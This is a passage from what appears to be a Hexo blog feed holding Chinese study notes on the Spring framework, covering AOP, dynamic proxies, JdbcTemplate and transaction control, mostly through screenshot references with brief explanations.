<h5 id="字符串注入"><a href="#字符串注入" class="headerlink" title="字符串注入"></a>字符串注入</h5><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201031163838067.png" alt="image-20201031163838067"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201031164004398.png" alt="image-20201031164004398"></p>
<p>这个才是重要的作用</p>
<h5 id="单例多例注解"><a href="#单例多例注解" class="headerlink" title="单例多例注解"></a>单例多例注解</h5><p>@Scope(singleton)@Scope(propotype)</p>
<h5 id="构造销毁注解"><a href="#构造销毁注解" class="headerlink" title="构造销毁注解"></a>构造销毁注解</h5><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201031164351070.png" alt="image-20201031164351070"></p>
<h4 id="Spring新注解介绍与详解"><a href="#Spring新注解介绍与详解" class="headerlink" title="Spring新注解介绍与详解"></a>Spring新注解介绍与详解</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201031164714651.png" alt="image-20201031164714651"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201031164723900.png" alt="image-20201031164723900"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201031165133492.png" alt="image-20201031165133492"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201031165329642.png" alt="image-20201031165329642"></p>
<p>自己实现：</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201101184642453.png" alt="image-20201101184642453"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201101184529458.png" alt="image-20201101184529458"></p>
<p>核心配置类加载分配置类。然后再测试：</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201101184623049.png" alt="image-20201101184623049"></p>
<p>成功</p>
<h3 id="35-36-Spring集成Junit"><a href="#35-36-Spring集成Junit" class="headerlink" title="35-36 Spring集成Junit"></a>35-36 Spring集成Junit</h3><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201101175524139.png" alt="image-20201101175524139"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201101175530757.png" alt="image-20201101175530757"></p>
<p>原先是右键直接找Junit，现在找Spring为我们提供的内核。在帮助找Junit的同时还做了很多事情帮助容器的创建，配置文件的加载。Runwith注解就是使用Spring的内核提供的内核去运行。</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201101191558970.png" alt="image-20201101191558970"></p>
<p>运行的时候抛出了个错误，让我用junit4.12以上版本，因为之前看教程上是4.11.改成4.13编译通过并成功运行：</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201101191658892.png" alt="image-20201101191658892"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201101191856372.png" alt="image-20201101191856372"></p>
<p>或是使用配置文件的方式测试。</p>
<h3 id="37-43-AOP简介"><a href="#37-43-AOP简介" class="headerlink" title="37-43 AOP简介"></a>37-43 AOP简介</h3><h4 id="1-1-什么是AOP"><a href="#1-1-什么是AOP" class="headerlink" title="1.1 什么是AOP"></a>1.1 什么是AOP</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201101192256363.png" alt="image-20201101192256363"></p>
<h4 id="1-2-AOP的作用及其优势"><a href="#1-2-AOP的作用及其优势" class="headerlink" title="1.2 AOP的作用及其优势"></a>1.2 AOP的作用及其优势</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201101193209122.png" alt="image-20201101193209122"></p>
<p>三个方法与日志控制不在代码层面进行结合，而是在配置文件中进行解耦合（一般目前解耦合的方法）。所以在save方法在内存中即将运行之前，通过配置文件将日志控制与save方法结合。</p>
<h4 id="1-3-AOP的底层实现"><a href="#1-3-AOP的底层实现" class="headerlink" title="1.3 AOP的底层实现"></a>1.3 AOP的底层实现</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102094624222.png" alt="image-20201102094624222"></p>
<h4 id="1-4AOP的动态代理技术"><a href="#1-4AOP的动态代理技术" class="headerlink" title="1.4AOP的动态代理技术"></a>1.4AOP的动态代理技术</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102094807238.png" alt="image-20201102094807238"></p>
<h4 id="1-5-基于jdk的动态代理"><a href="#1-5-基于jdk的动态代理" class="headerlink" title="1.5 基于jdk的动态代理"></a>1.5 基于jdk的动态代理</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102100333205.png" alt="image-20201102100333205"></p>
<p>1、动态代理生成的对象和Proxy是兄弟关系，所以用Target类去接收是不行的 要用父类去接受。【上图讲到过】。2、第一个invoke是动态代理的invoke，第二个invoke是反射的invoke。</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102101830461.png" alt="image-20201102101830461"></p>
<p>这里获得到的参数是数组，所以可以实现一个接口的多个方法【因为这里是父类去接收】。</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102114053408.png" alt="image-20201102114053408"></p>
<p>会把这两个方法一起增强</p>
<h4 id="1-6-基于cglib的动态代理"><a href="#1-6-基于cglib的动态代理" class="headerlink" title="1.6 基于cglib的动态代理"></a>1.6 基于cglib的动态代理</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102120809011.png" alt="image-20201102120809011"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102121957660.png" alt="image-20201102121957660"></p>
<p>这里设置了回调函数之后先进行创建代理对象，在create的时候检查了回调函数。再在运行save方法的时候进入上图处调用方法。</p>
<h4 id="1-7-AOP相关概念"><a href="#1-7-AOP相关概念" class="headerlink" title="1.7 AOP相关概念"></a>1.7 AOP相关概念</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102132214285.png" alt="image-20201102132214285"></p>
<p>上面是名词，下面指的是整一个切入点和通知在一起实现的过程。【切面实现过程】</p>
<p>上面的连接点指的是<strong>可以</strong>被增强的方法，而切入点是指实际被增强的方法，通知指的是增强方法的实现。</p>
<h4 id="1-8-AOP开发明确事项"><a href="#1-8-AOP开发明确事项" class="headerlink" title="1.8 AOP开发明确事项"></a>1.8 AOP开发明确事项</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102133322231.png" alt="image-20201102133322231"></p>
<p>jdk或者cglib的动态代理。</p>
<h4 id="1-9-知识要点"><a href="#1-9-知识要点" class="headerlink" title="1.9 知识要点"></a>1.9 知识要点</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102133500016.png" alt="image-20201102133500016"></p>
<h3 id="44-48、基于XML的AOP开发"><a href="#44-48、基于XML的AOP开发" class="headerlink" title="44-48、基于XML的AOP开发"></a>44-48、基于XML的AOP开发</h3><h4 id="2-1-快速入门"><a href="#2-1-快速入门" class="headerlink" title="2.1 快速入门"></a>2.1 快速入门</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102143618495.png" alt="image-20201102143618495"></p>
<p>1、导入AOP相关坐标</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102143637414.png" alt="image-20201102143637414"></p>
<p>虽然spring自带aop实现，但是aspectj的实现更好，spring也主张使用，所以再导入这个坐标。</p>
<p>2、创建目标接口和目标类（内部有切点）</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102143705421.png" alt="image-20201102143705421"></p>
<p>3、创建切面类，内部有增强方法</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102143737052.png" alt="image-20201102143737052"></p>
<p>4、将目标类和切面类的创建权交给spring（ioc）</p>
<p>5、在applicationContext.xml中配置植入关系</p>
<p> 引入AOP的命名空间和约束位置</p>
<p>当访问target类的save方法时，需要有个前置增强，而这个前置增强在MyAspect类中的before方法。</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102135113479.png" alt="image-20201102135113479"></p>
<p>6、测试</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102144016344.png" alt="image-20201102144016344"></p>
<p>注意这里只能是接口类.</p>
<p>如果是实现类</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102144256017.png" alt="image-20201102144256017"></p>
<p>动态代理创建的是proxy类而不是原生类。</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102162227107.png" alt="image-20201102162227107"></p>
<p>虽然此处target是targetInterface类型的，但是容器中的配置文件配置的是TargetInterface的实现类Target，所以生成的时候实现了多态。</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102163027045.png" alt="image-20201102163027045"></p>
<p>一个是Target类 一个是实现的多态。</p>
<h4 id="2-2-XML配置AOP详解"><a href="#2-2-XML配置AOP详解" class="headerlink" title="2.2 XML配置AOP详解"></a>2.2 XML配置AOP详解</h4><h5 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h5><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102160252434.png" alt="image-20201102160252434"></p>
<h5 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h5><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102160406621.png" alt="image-20201102160406621"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102161128379.png" alt="image-20201102161128379"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102161502088.png" alt="image-20201102161502088"></p>
<p>前置后置和环绕。环绕要多传一个切点的参数并返回切点方法的返回值并抛出异常。捕捉到异常之后也会加入最终增强。</p>
<h5 id="3-切点表达式的抽取"><a href="#3-切点表达式的抽取" class="headerlink" title="3. 切点表达式的抽取"></a>3. 切点表达式的抽取</h5><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102161651843.png" alt="image-20201102161651843"></p>
<h4 id="2-3-知识要点"><a href="#2-3-知识要点" class="headerlink" title="2.3 知识要点"></a>2.3 知识要点</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102161824356.png" alt="image-20201102161824356"></p>
<h3 id="49-51-注解方式实现AOP"><a href="#49-51-注解方式实现AOP" class="headerlink" title="49-51 注解方式实现AOP"></a>49-51 注解方式实现AOP</h3><h4 id="3-1-快速入门"><a href="#3-1-快速入门" class="headerlink" title="3.1 快速入门"></a>3.1 快速入门</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102162014720.png" alt="image-20201102162014720"></p>
<p>3、4、</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102165156877.png" alt="image-20201102165156877"></p>
<p>5、</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102165137913.png" alt="image-20201102165137913"></p>
<h4 id="3-2-注解配置AOP详解"><a href="#3-2-注解配置AOP详解" class="headerlink" title="3.2 注解配置AOP详解"></a>3.2 注解配置AOP详解</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102165334202.png" alt="image-20201102165334202"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102165430793.png" alt="image-20201102165430793"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102165638987.png" alt="image-20201102165638987"></p>
<p>红色部分只是为了让这个切点表达式有个宿主所以随便定义一个空函数。</p>
<h4 id="3-3-知识要点"><a href="#3-3-知识要点" class="headerlink" title="3.3 知识要点"></a>3.3 知识要点</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102170044036.png" alt="image-20201102170044036"></p>
<h3 id="52-60、-JdbcTemplate基本使用"><a href="#52-60、-JdbcTemplate基本使用" class="headerlink" title="52-60、 JdbcTemplate基本使用"></a>52-60、 JdbcTemplate基本使用</h3><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102170502791.png" alt="image-20201102170502791"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102170517526.png" alt="image-20201102170517526"></p>
<p>①spring-tx的包是因为jdbc用到事务，所以这个包也导。</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102171756008.png" alt="image-20201102171756008"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102171907218.png" alt="image-20201102171907218"></p>
<p>如果想要对象注入，注入对象和被注入对象都必须存在ioc容器当中。【JdbcTemplate模板对象中要注入数据源对象】</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102172631111.png" alt="image-20201102172631111"></p>
<p>抽取操作：</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102173713776.png" alt="image-20201102173713776"></p>
<p>模板的基本使用：</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102175504095.png" alt="image-20201102175504095"></p>
<p>这里查询操作返回一个实体封装，rowMapper接口的实现。</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102175628040.png" alt="image-20201102175628040"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102175653022.png" alt="image-20201102175653022"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102175726163.png" alt="image-20201102175726163"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102205041587.png" alt="image-20201102205041587"></p>
<p>看返回类型实现类型是简单类型还是实体类型。【实体属性行映射BeanPropertyRowMapper】</p>
<h4 id="1-6-知识要点"><a href="#1-6-知识要点" class="headerlink" title="1.6 知识要点"></a>1.6 知识要点</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102205153673.png" alt="image-20201102205153673"></p>
<h3 id="61-71-Spring的事务控制"><a href="#61-71-Spring的事务控制" class="headerlink" title="61-71 Spring的事务控制"></a>61-71 Spring的事务控制</h3><h4 id="1、编程式事务控制"><a href="#1、编程式事务控制" class="headerlink" title="1、编程式事务控制"></a>1、编程式事务控制</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102205847290.png" alt="image-20201102205847290"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102210323063.png" alt="image-20201102210323063"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102210620675.png" alt="image-20201102210620675"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102210633521.png" alt="image-20201102210633521"></p>
<p>这里所有的都看成A、B业务之间的关系，比方说A调用B事务：1、REQUIRED：B检查A如果当前没有事务，B就新建一个事务。如果A存在事务，那么B就加入到这个事务当中去。可以设置查询的超时时间。</p>
<p>这个类最主要是维护事务相关参数的。</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102211412328.png" alt="image-20201102211412328"></p>
<h4 id="1-4-知识要点"><a href="#1-4-知识要点" class="headerlink" title="1.4 知识要点"></a>1.4 知识要点</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102211755663.png" alt="image-20201102211755663"></p>
<p>1、PlatformTransactionManager：是一个<strong>接口类</strong>，指定行为，具体需要实现。实现根据不同的DAO层而定的。因为内部封装控制事务的方式（api）是不一样的。2、TransactionDefinition：封装一些事物的参数的【1、2对象在申明配置时要告诉spring框架】3、TransactionStatus：事务运行时被动收集事务状态的信息。会动态改变。</p>
<h4 id="2、基于XML的事务控制（声明式事务控制）"><a href="#2、基于XML的事务控制（声明式事务控制）" class="headerlink" title="2、基于XML的事务控制（声明式事务控制）"></a>2、基于XML的事务控制（声明式事务控制）</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102215230373.png" alt="image-20201102215230373"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102215923519.png" alt="image-20201102215923519"></p>
<p>改成tx再对整个业务流程进行AOP层面的封装</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102220651242.png" alt="image-20201102220651242"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102221103695.png" alt="image-20201102221103695"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102222100356.png" alt="image-20201102222100356"></p>
<p>事务管理器【内部控制事务时还是通过connection&lt;-(连接对象)（rollback，commit ，connection要从数据源上面引】底层会从dataSource拿一个connection去进行一个事务的控制。</p>
<p>这里事务的切面引用是advisor 相当于aop的aspect</p>
<p>一个事务（方法）可以配置属于自己的属性参数</p>
<h4 id="2-4-知识要点"><a href="#2-4-知识要点" class="headerlink" title="2.4 知识要点"></a>2.4 知识要点</h4><p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201102222718550.png" alt="image-20201102222718550"></p>
<h4 id="基于注解的声明式事务控制"><a href="#基于注解的声明式事务控制" class="headerlink" title="基于注解的声明式事务控制"></a>基于注解的声明式事务控制</h4><p>知识点回顾：autowired注入 set方法可以不许需要</p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201104173010087.png" alt="image-20201104173010087"></p>
<p><img src="/2020/10/31/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91%20/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201104173019427.png" alt="image-20201104173019427"></p>
]]></content>
  </entry>
  <entry>
    <title>spring开发/spring开发</title>
    <url>/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<h3 id="1-7、Spring开发步骤"><a href="#1-7、Spring开发步骤" class="headerlink" title="1-7、Spring开发步骤"></a>1-7、Spring开发步骤</h3><p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029105627853.png" alt="image-20201029105627853"></p>
<p>第一步导入框架对应的jar包，找到spring对应的maven坐标。第二步编写对应的接口和userdaoImpl的实现。第三步创建xml配置文件。第四步讲全包名导入到xml配置文件当中。第五步spring.getbean（api）标识传进去并返回对象。【这样就是从spring容器去要对象，而不是自己去new】</p>
<p><code>如何解耦合</code>：直接在tomcat的配置文件中id标识的全包名更换</p>
<p>第一步【导入坐标】：</p>
<p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029135454258.png" alt="image-20201029135454258"></p>
<p>可能会报红字，maven下载源码即可。</p>
<p>第二步编写对应接口和实现类（impl）：</p>
<p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029141341049.png" alt="image-20201029141341049"></p>
<p>第三步创建xml文件，bean对象</p>
<p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029141301750.png" alt="image-20201029141301750"></p>
<p>第五步创建ApplicationContext对象getBean提供bean id参数。</p>
<p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029141616323.png" alt="image-20201029141616323"></p>
<h3 id="8-11-Spring配置文件详解"><a href="#8-11-Spring配置文件详解" class="headerlink" title="8-11 Spring配置文件详解"></a>8-11 Spring配置文件详解</h3><h4 id="3-1-bean标签基本配置"><a href="#3-1-bean标签基本配置" class="headerlink" title="3.1 bean标签基本配置"></a>3.1 bean标签基本配置</h4><p>默认情况下是调用该类的无参构造器。</p>
<p>id是唯一性表示不允许重复，class：bean的全限定名称。</p>
